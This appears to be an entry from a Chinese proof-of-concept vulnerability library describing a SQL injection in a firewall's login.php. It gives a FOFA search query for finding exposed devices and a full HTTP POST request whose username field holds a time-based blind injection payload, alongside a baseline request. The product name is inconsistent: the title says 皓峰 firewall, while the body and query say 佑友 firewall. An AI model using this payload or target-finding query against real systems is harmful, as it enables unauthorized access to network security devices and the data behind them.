---
fofa: "title="
source: "wy876 漏洞文库"
---

# 皓峰防火墙login.php存在SQL注入漏洞

# 一、漏洞简介
深圳市皓峰通讯技术有限公司成立于2004年，位于深圳市高新技术产业园，是经过国家认定的“双软”企业和“国家高新技术企业”。佑友防火墙login存在SQL注入漏洞

# 二、影响版本
+ 佑友防火墙

# 三、资产测绘
```plain
fofa：title="佑友防火墙"
```


# 四、漏洞复现
```plain
POST /login.php HTTP/1.1
Host: 
Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 67

action=login&username=dadsa' AND (SELECT 6357 FROM (SELECT(SLEEP(5)))DIFt) AND 'lKDb'='lKDb&password=dada&submit=%E7%99%BB%E5%BD%95
```


```plain
POST /login.php HTTP/1.1
Host: 
Cookie: PHPSESSID=qc13eucchtnbr161lnca4ibde1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 67

action=login&username=dadsa&password=dada&submit=%E7%99%BB%E5%BD%95
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eavau8fm2o7mcft9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
